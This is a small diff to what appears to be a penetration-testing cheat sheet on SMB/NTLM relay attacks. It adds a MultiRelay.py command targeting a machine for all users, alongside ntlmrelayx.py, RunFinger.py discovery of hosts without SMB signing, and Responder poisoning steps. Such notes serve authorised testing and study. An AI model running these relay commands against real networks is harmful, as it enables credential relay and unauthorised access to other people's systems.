@@ -14,6 +14,7 @@ Run python  **RunFinger.py -i IP_Range** to detect machine with SMB signing:disa
 echo "IP"  >> targets.txt**
  ```   
  ```
+ python MultiRelay.py -t <target_machine_IP> -u ALL
  ntlmrelayx.py -tf targets.txt --smb2support**
  ```
 3. Disable SMB and HTTP response poisoning in Responder and launch
